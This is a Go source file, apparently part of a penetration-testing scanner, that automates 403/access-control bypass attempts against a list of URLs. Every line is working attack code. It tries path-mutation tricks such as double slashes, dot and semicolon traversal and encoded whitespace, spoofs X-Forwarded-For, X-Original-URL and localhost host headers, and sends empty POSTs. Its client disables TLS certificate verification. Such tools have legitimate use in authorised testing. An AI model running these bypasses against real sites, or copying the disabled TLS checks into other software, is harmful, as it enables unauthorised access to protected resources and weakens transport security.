package bypass

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

type Result struct {
	URL        string `json:"url"`
	BypassURL  string `json:"bypass_url,omitempty"`
	Technique  string `json:"technique"`
	StatusCode int    `json:"status_code"`
	Bypassed   bool   `json:"bypassed"`
}

var client = &http.Client{
	Timeout: 8 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func Check(forbidden []string, threads int, onFound func(Result)) []Result {
	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
	)
	for _, u := range forbidden {
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()
			for _, r := range checkOne(u) {
				mu.Lock()
				results = append(results, r)
				mu.Unlock()
				if onFound != nil {
					onFound(r)
				}
			}
		}(u)
	}
	wg.Wait()
	return results
}

func checkOne(rawURL string) []Result {
	parsed, err := parseURL(rawURL)
	if err != nil {
		return nil
	}
	scheme := parsed[0]
	host := parsed[1]
	path := parsed[2]

	var results []Result

	pathVariants := []struct {
		url       string
		technique string
	}{
		{fmt.Sprintf("%s://%s//%s", scheme, host, strings.TrimPrefix(path, "/")), "double slash"},
		{fmt.Sprintf("%s://%s/.%s", scheme, host, path), "dot traversal"},
		{fmt.Sprintf("%s://%s%s/", scheme, host, path), "trailing slash"},
		{fmt.Sprintf("%s://%s%s/.", scheme, host, path), "trailing dot"},
		{fmt.Sprintf("%s://%s%s%%20", scheme, host, path), "space encoding"},
		{fmt.Sprintf("%s://%s%s%%09", scheme, host, path), "tab encoding"},
		{fmt.Sprintf("%s://%s/.%s", scheme, host, strings.TrimPrefix(path, "/")), "dot prefix"},
		{fmt.Sprintf("%s://%s%s..;/", scheme, host, path), "semicolon bypass"},
	}

	for _, v := range pathVariants {
		req, err := http.NewRequest("GET", v.url, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		bypassed := resp.StatusCode == 200 || resp.StatusCode == 302
		results = append(results, Result{
			URL:        rawURL,
			BypassURL:  v.url,
			Technique:  v.technique,
			StatusCode: resp.StatusCode,
			Bypassed:   bypassed,
		})
	}

	headerTricks := []struct {
		key   string
		value string
		name  string
	}{
		{"X-Forwarded-For", "127.0.0.1", "X-Forwarded-For"},
		{"X-Real-IP", "127.0.0.1", "X-Real-IP"},
		{"X-Original-URL", path, "X-Original-URL"},
		{"X-Rewrite-URL", path, "X-Rewrite-URL"},
		{"X-Custom-IP-Authorization", "127.0.0.1", "X-Custom-IP-Authorization"},
		{"X-Forwarded-Host", "localhost", "X-Forwarded-Host"},
		{"X-Host", "localhost", "X-Host"},
	}

	for _, h := range headerTricks {
		req, err := http.NewRequest("GET", rawURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set(h.key, h.value)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		bypassed := resp.StatusCode == 200 || resp.StatusCode == 302
		results = append(results, Result{
			URL:        rawURL,
			Technique:  "header:" + h.name,
			StatusCode: resp.StatusCode,
			Bypassed:   bypassed,
		})
	}

	req, err := http.NewRequest("POST", rawURL, nil)
	if err == nil {
		req.Header.Set("Content-Length", "0")
		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
			bypassed := resp.StatusCode == 200 || resp.StatusCode == 302
			results = append(results, Result{
				URL:        rawURL,
				Technique:  "POST Content-Length:0",
				StatusCode: resp.StatusCode,
				Bypassed:   bypassed,
			})
		}
	}

	return results
}

func parseURL(rawURL string) ([]string, error) {
	var scheme, host, path string
	rest := rawURL
	if strings.HasPrefix(rest, "https://") {
		scheme = "https"
		rest = rest[8:]
	} else if strings.HasPrefix(rest, "http://") {
		scheme = "http"
		rest = rest[7:]
	} else {
		return nil, fmt.Errorf("unsupported scheme")
	}
	idx := strings.Index(rest, "/")
	if idx < 0 {
		host = rest
		path = "/"
	} else {
		host = rest[:idx]
		path = rest[idx:]
	}
	return []string{scheme, host, path}, nil
}
